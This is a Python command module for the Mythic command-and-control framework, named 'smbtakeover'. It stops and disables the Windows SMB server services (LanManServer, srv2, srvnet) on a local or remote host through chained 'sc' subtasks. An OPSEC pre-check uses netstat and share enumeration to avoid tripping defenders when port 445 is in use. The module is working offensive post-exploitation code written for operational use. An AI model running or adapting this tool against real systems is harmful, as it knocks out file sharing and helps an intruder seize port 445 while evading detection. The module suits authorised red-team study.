from mythic_container.MythicCommandBase import *
from mythic_container.MythicRPC import *
import asyncio
import json


class SmbTakeoverArguments(TaskArguments):
    def __init__(self, command_line, **kwargs):
        super().__init__(command_line, **kwargs)
        self.args = [
            CommandParameter(
                name="delay_seconds",
                cli_name="Delay",
                display_name="Delay Between Steps (seconds)",
                type=ParameterType.Number,
                default_value=2,
                description="Seconds to wait between each sc step",
                parameter_group_info=[ParameterGroupInfo(required=False)],
            ),
            CommandParameter(
                name="enable-445",
                cli_name="enable-445",
                display_name="Enable 445",
                type=ParameterType.Boolean,
                default_value=False,
                description="Enable LanManServer (set auto start and start service)",
                parameter_group_info=[ParameterGroupInfo(required=False)],
            ),
            CommandParameter(
                name="disable-445",
                cli_name="disable-445",
                display_name="Disable 445",
                type=ParameterType.Boolean,
                default_value=False,
                description="Disable LanManServer and stop related SMB services",
                parameter_group_info=[ParameterGroupInfo(required=False)],
            ),
        ]

    async def parse_arguments(self):
        if self.command_line and self.command_line.startswith("{"):
            self.load_args_from_json_string(self.command_line)
        else:
            # allow blank / default
            try:
                self.add_arg("computer", "")
            except Exception:
                pass


class SmbTakeoverCommand(CommandBase):
    cmd = "smbtakeover"
    needs_admin = False
    help_cmd = "smbtakeover"
    description = "Enable/Disable SMB (445) by controlling LanManServer and related services via sc. WARNING: THIS WILL KILL YOUR ****SMB**** TRANSPORT. "
    version = 3
    author = "@yourname"
    argument_class = SmbTakeoverArguments
    attackmapping = ["T1106"]
    script_only = False
    
    async def opsec_pre(self, taskData: PTTaskMessageAllData) -> PTTTaskOPSECPreTaskMessageResponse:
        response = PTTTaskOPSECPreTaskMessageResponse(
            TaskID=taskData.Task.ID, 
            Success=True, 
            OpsecPreBlocked=False,
            OpsecPreBypassRole="lead",
            OpsecPreMessage="OPSEC checks passed",
        )
        
        computer = taskData.args.get_arg("computer") or ""

        if taskData.args.get_arg("enable-445") == True:
            response.OpsecPreBlocked = False
            return response 


        
        try:
            # Check 1: Count established port 445 connections
            netstat_params = {
                "established": True,
                "tcp": True
            }
            
            # Create netstat subtask to check established connections
            netstat_task = await SendMythicRPCTaskCreateSubtask(
                MythicRPCTaskCreateSubtaskMessage(
                    TaskID=taskData.Task.ID,
                    CommandName="netstat",
                    Params=json.dumps(netstat_params),
                    SubtaskGroupName="opsec_check",
                    GroupOrder=1,
                )
            )
            
            # Wait for netstat result
            await asyncio.sleep(2)
            
            # Get netstat response
            netstat_responses = await SendMythicRPCResponseSearch(
                MythicRPCResponseSearchMessage(TaskID=netstat_task.TaskID)
            )
            
            port_445_count = 0
            
            for output in netstat_responses.Responses:
                ports = json.loads(output.Response)
                for port in ports:
                    logger.error(port['local_port'])
                    if port['local_port'] == 445:
                        port_445_count += 1 
                        logger.error(f"Connection to port 445 detected: {port_445_count}")

            # Check 2: Check for non-hidden shared folders
            net_shares_params = {
                "computer": computer
            }
            
            # Create net_shares subtask
            shares_task = await SendMythicRPCTaskCreateSubtask(
                MythicRPCTaskCreateSubtaskMessage(
                    TaskID=taskData.Task.ID,
                    CommandName="net_shares",
                    Params=json.dumps(net_shares_params),
                    SubtaskGroupName="opsec_check",
                    GroupOrder=2,
                )
            )
            
            # Wait for net_shares result
            await asyncio.sleep(2)
            
            # Get net_shares response
            shares_responses = await SendMythicRPCResponseSearch(
                MythicRPCResponseSearchMessage(TaskID=shares_task.TaskID)
            )
            for output in netstat_responses.Responses:
                logger.error(output.Response)

            for output in shares_responses.Responses:
                logger.error(output.Response)
            has_visible_shares = False



            for output in shares_responses.Responses:
                shares = json.loads(output.Response)
                for share in shares:
                    logger.error(share['share_name'])
                    if '$' in share['share_name']:
                        pass
                    else:
                        has_visible_shares = True

#            
            # OPSEC Decision Logic
            if port_445_count > 0:
                response.OpsecPreBlocked = True
                response.OpsecPreMessage = f"OPSEC BLOCKED: Found {port_445_count} established port 445 connections (threshold: 1)"
            elif has_visible_shares:
                response.OpsecPreBlocked = True
                response.OpsecPreMessage = "OPSEC BLOCKED: Found visible shared folders (non-hidden shares detected)"
            else:
                response.OpsecPreBlocked = False
                response.OpsecPreMessage = f"OPSEC PASSED: Port 445 connections: {port_445_count}, Visible shares: {has_visible_shares}"
                
        except Exception as e:
            response.OpsecPreBlocked = True
            response.OpsecPreMessage = f"OPSEC ERROR: Failed to perform checks - {str(e)}"
            
        return response

    async def create_go_tasking(self, taskData: PTTaskMessageAllData) -> PTTaskCreateTaskingMessageResponse:
        response = PTTaskCreateTaskingMessageResponse(
            TaskID=taskData.Task.ID,
            Success=True,
        )

        computer = taskData.args.get_arg("computer") or ""
        delay_s = taskData.args.get_arg("delay_seconds")
        try:
            delay_s = int(delay_s) if delay_s is not None else 2
        except Exception:
            delay_s = 2
        enable = bool(taskData.args.get_arg("enable-445"))
        disable = bool(taskData.args.get_arg("disable-445"))

        if enable and disable:
            response.Success = False
            response.Error = "Choose only one: enable-445 or disable-445"
            return response

        # default to disable if neither explicitly set
        if not enable and not disable:
            disable = True

        try:
            if disable:
                # 1) Disable LanManServer
                step1_params = {
                    "modify": True,
                    "computer": computer,
                    "service": "LanManServer",
                    "start_type": "SERVICE_DISABLED",
                }
                # 2) Stop LanManServer
                step2_params = {"stop": True, "computer": computer, "service": "LanManServer"}
                # 3) Stop srv2
                step3_params = {"stop": True, "computer": computer, "service": "srv2"}
                # 4) Stop srvnet
                step4_params = {"stop": True, "computer": computer, "service": "srvnet"}

                await SendMythicRPCTaskCreateSubtask(
                    MythicRPCTaskCreateSubtaskMessage(
                        TaskID=taskData.Task.ID,
                        CommandName="sc",
                        Params=json.dumps(step1_params),
                        SubtaskGroupName="smbtakeover",
                        GroupOrder=1,
                    )
                )
                await asyncio.sleep(max(0, delay_s))
                await SendMythicRPCTaskCreateSubtask(
                    MythicRPCTaskCreateSubtaskMessage(
                        TaskID=taskData.Task.ID,
                        CommandName="sc",
                        Params=json.dumps(step2_params),
                        SubtaskGroupName="smbtakeover",
                        GroupOrder=2,
                    )
                )
                await asyncio.sleep(max(0, delay_s))
                await SendMythicRPCTaskCreateSubtask(
                    MythicRPCTaskCreateSubtaskMessage(
                        TaskID=taskData.Task.ID,
                        CommandName="sc",
                        Params=json.dumps(step3_params),
                        SubtaskGroupName="smbtakeover",
                        GroupOrder=3,
                    )
                )
                await asyncio.sleep(max(0, delay_s))
                await SendMythicRPCTaskCreateSubtask(
                    MythicRPCTaskCreateSubtaskMessage(
                        TaskID=taskData.Task.ID,
                        CommandName="sc",
                        Params=json.dumps(step4_params),
                        SubtaskGroupName="smbtakeover",
                        GroupOrder=4,
                    )
                )
                response.DisplayParams = "-disable-445 {} -Delay {}s".format(computer if computer else "(local)", delay_s)
                response.Success = True
                response.TaskStatus = "success"
                response.Completed = True
            else:
                # enable flow
                # 1) Modify LanManServer to auto start
                step1_params = {
                    "modify": True,
                    "computer": computer,
                    "service": "LanManServer",
                    "start_type": "SERVICE_AUTO_START",
                }
                # 2) Start LanManServer
                step2_params = {"start": True, "computer": computer, "service": "LanManServer"}

                await SendMythicRPCTaskCreateSubtask(
                    MythicRPCTaskCreateSubtaskMessage(
                        TaskID=taskData.Task.ID,
                        CommandName="sc",
                        Params=json.dumps(step1_params),
                        SubtaskGroupName="smbtakeover",
                        GroupOrder=1,
                    )
                )
                await asyncio.sleep(max(0, delay_s))
                await SendMythicRPCTaskCreateSubtask(
                    MythicRPCTaskCreateSubtaskMessage(
                        TaskID=taskData.Task.ID,
                        CommandName="sc",
                        Params=json.dumps(step2_params),
                        SubtaskGroupName="smbtakeover",
                        GroupOrder=2,
                    )
                )
                response.DisplayParams = "-enable-445 {} -Delay {}s".format(computer if computer else "(local)", delay_s)
                response.Success = True
                response.TaskStatus = "success"
                response.Completed = True


                
        except Exception as e:
            response.Success = False
            response.Error = f"Failed to create subtasks: {e}"

        logger.error(dir(response))
        return response

    async def process_response(self, task: PTTaskMessageAllData, response: any) -> PTTaskProcessResponseMessageResponse:
        resp = PTTaskProcessResponseMessageResponse(TaskID=task.Task.ID, Success=True)
        return resp

